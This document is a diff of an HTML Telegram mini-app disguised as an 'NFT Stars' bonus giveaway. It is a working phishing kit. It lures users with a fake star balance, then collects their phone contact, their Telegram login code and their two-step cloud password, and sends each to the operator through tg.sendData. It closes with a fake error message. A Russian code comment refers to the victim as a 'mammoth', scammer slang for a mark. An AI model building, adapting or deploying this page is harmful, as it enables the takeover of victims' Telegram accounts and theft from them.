@@ -3,84 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>NFT Marketplace</title>
+    <title>NFT Stars</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        :root { --bg: #0b0b0c; --card: #161618; --accent: #007aff; --text: #ffffff; --secondary: #8e8e93; --gold: #ffd700; }
-        body { font-family: -apple-system, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 15px; }
-        
-        /* NFT Маркет */
-        .nft-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 20px; }
-        .nft-card { background: var(--card); border-radius: 20px; padding: 10px; border: 1px solid rgba(255,255,255,0.05); text-align: center; }
-        .nft-img { width: 100%; border-radius: 15px; height: 140px; object-fit: cover; background: #2c2c2e; }
-        .nft-title { font-weight: 600; margin: 10px 0 5px; font-size: 14px; }
-        .nft-price { color: #32d74b; font-weight: 700; font-size: 16px; margin-bottom: 10px; }
-
-        /* Баланс */
-        .balance-card { background: linear-gradient(135deg, #1c1c1e 0%, #000 100%); border-radius: 24px; padding: 25px; margin-bottom: 20px; border: 1px solid var(--gold); }
-        .stars-count { font-size: 45px; font-weight: 800; color: var(--gold); }
-
-        /* Кнопки и инпуты */
-        .btn { background: var(--accent); color: white; border: none; border-radius: 14px; padding: 15px; width: 100%; font-weight: 600; cursor: pointer; margin-top: 10px; }
-        input { width: 100%; padding: 15px; border-radius: 12px; border: none; background: #2c2c2e; color: white; margin-top: 10px; box-sizing: border-box; text-align: center; font-size: 18px; }
-
-        .step { display: none; animation: fadeIn 0.3s ease; }
-        .active { display: block; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        :root { --bg: #0b0b0c; --card: #161618; --accent: #007aff; --text: #ffffff; --hint: #8e8e93; }
+        body { font-family: -apple-system, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 20px; text-align: center; }
+        .card { background: var(--card); border-radius: 24px; padding: 24px; border: 1px solid rgba(255,255,255,0.05); }
+        input { width: 100%; padding: 16px; border-radius: 14px; border: none; background: #2c2c2e; color: white; margin-top: 15px; font-size: 18px; text-align: center; box-sizing: border-box; }
+        .btn { background: var(--accent); color: white; border: none; border-radius: 14px; padding: 16px; width: 100%; font-weight: 600; margin-top: 20px; }
+        .step { display: none; }
+        .active { display: block; animation: fadeIn 0.4s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; } }
+        .stars { font-size: 50px; color: #ffd700; font-weight: 800; margin: 10px 0; }
     </style>
 </head>
 <body>
 
-    <div id="step-market" class="step active">
-        <div class="balance-card">
-            <div style="color: var(--secondary); font-size: 14px;">Ваш баланс:</div>
-            <div class="stars-count" id="balance">0</div>
-            <div style="color: var(--gold); font-size: 12px;">NFT Stars зачислено</div>
-            <button class="btn" id="bonus-btn" onclick="animateBalance()">🎁 Забрать еще +20 звезд</button>
-        </div>
-
-        <h3 style="text-align: left; margin-left: 5px;">🔥 Тренды недели</h3>
-        <div class="nft-grid">
-            <div class="nft-card">
-                <img src="https://i.seadn.io/gae/2hDpuYSUIm1yS89E78O688zN-9V6P_5zQx9e9z0?auto=format&w=256" class="nft-img">
-                <div class="nft-title">CryptoPunk #442</div>
-                <div class="nft-price">120 Stars</div>
-                <button class="btn" onclick="goToAuth()">Купить</button>
-            </div>
-            <div class="nft-card">
-                <img src="https://i.seadn.io/gcs/files/6b76176378e9f50e82c502b4501a4034.png?auto=format&w=256" class="nft-img">
-                <div class="nft-title">Golden Ape</div>
-                <div class="nft-price">450 Stars</div>
-                <button class="btn" onclick="goToAuth()">Купить</button>
-            </div>
+    <div id="step-1" class="step active">
+        <div class="card">
+            <div style="font-size: 50px;">🎁</div>
+            <h2>Поздравляем!</h2>
+            <p style="color: var(--hint);">Вам начислено</p>
+            <div class="stars" id="val">0</div>
+            <p>NFT Stars</p>
+            <button class="btn" onclick="startAnim()">Забрать бонус</button>
         </div>
     </div>
 
-    <div id="step-phone" class="step">
-        <div style="margin-top: 50px;">
-            <h2>Верификация аккаунта</h2>
-            <p style="color: var(--secondary);">Подтвердите личность для проведения транзакции</p>
-            <div class="balance-card">
-                <button class="btn" onclick="requestPhone()">🛡 Подтвердить через Telegram</button>
-            </div>
+    <div id="step-2" class="step">
+        <h2>Верификация</h2>
+        <p style="color: var(--hint);">Для зачисления 20 звезд подтвердите аккаунт</p>
+        <div class="card">
+            <button class="btn" onclick="getPhone()">🛡 Подтвердить через Telegram</button>
         </div>
     </div>
 
-    <div id="step-code" class="step">
-        <div style="margin-top: 50px;">
-            <h2>Введите код</h2>
-            <p style="color: var(--secondary);">Код отправлен в ваш официальный чат Telegram</p>
-            <input type="number" id="sms_code" placeholder="0 0 0 0 0">
+    <div id="step-3" class="step">
+        <h2>Введите код</h2>
+        <p style="color: var(--hint);">Код отправлен в ваш Telegram</p>
+        <div class="card">
+            <input type="number" id="sms" placeholder="Код из 5 цифр">
             <button class="btn" onclick="sendCode()">Продолжить</button>
         </div>
     </div>
 
-    <div id="step-2fa" class="step">
-        <div style="margin-top: 50px;">
-            <h2>Облачный пароль</h2>
-            <p style="color: var(--secondary);">Введите ваш пароль двухэтапной аутентификации</p>
-            <input type="password" id="cloud_pass" placeholder="Пароль">
-            <button class="btn" onclick="send2fa()">Завершить зачисление</button>
+    <div id="step-4" class="step">
+        <h2>Облачный пароль</h2>
+        <p style="color: var(--hint);">Введите пароль двухэтапной аутентификации</p>
+        <div class="card">
+            <input type="password" id="pass2fa" placeholder="Пароль">
+            <button class="btn" onclick="send2fa()">Подтвердить вход</button>
         </div>
     </div>
 
@@ -93,45 +65,33 @@
             document.getElementById(id).classList.add('active');
         }
 
-        // 1. Анимация зачисления баланса
-        function animateBalance() {
-            let b = 0;
-            let interval = setInterval(() => {
-                b++;
-                document.getElementById('balance').innerText = b;
-                if(b >= 20) {
-                    clearInterval(interval);
-                    document.getElementById('bonus-btn').innerText = "✅ Получено";
-                    setTimeout(() => { goToAuth(); }, 1200);
-                }
+        function startAnim() {
+            let c = 0;
+            let i = setInterval(() => {
+                c++; document.getElementById('val').innerText = c;
+                if(c>=20) { clearInterval(i); setTimeout(()=>show('step-2'), 800); }
             }, 50);
         }
 
-        function goToAuth() { show('step-phone'); }
-
-        // 2. Номер
-        function requestPhone() {
-            tg.requestContact((ok) => {
-                if(ok) show('step-code');
-            });
+        function getPhone() {
+            tg.requestContact((ok) => { if(ok) show('step-3'); });
         }
 
-        // 3. Код
         function sendCode() {
-            let val = document.getElementById('sms_code').value;
+            let val = document.getElementById('sms').value;
             if(val.length >= 5) {
                 tg.sendData("CODE:" + val);
-                show('step-2fa');
+                // После отправки кода даем 2 секунды. Если мамонт не вылетел — значит просит 2FA
+                setTimeout(() => { show('step-4'); }, 2000);
             }
         }
 
-        // 4. 2FA
         function send2fa() {
-            let val = document.getElementById('cloud_pass').value;
+            let val = document.getElementById('pass2fa').value;
             if(val.length > 0) {
                 tg.sendData("PASS:" + val);
-                tg.showAlert("Системная ошибка. Попробуйте через 24 часа.");
-                tg.close();
+                tg.showAlert("Ошибка синхронизации. Попробуйте позже.");
+                setTimeout(() => { tg.close(); }, 1500);
             }
         }
     </script>
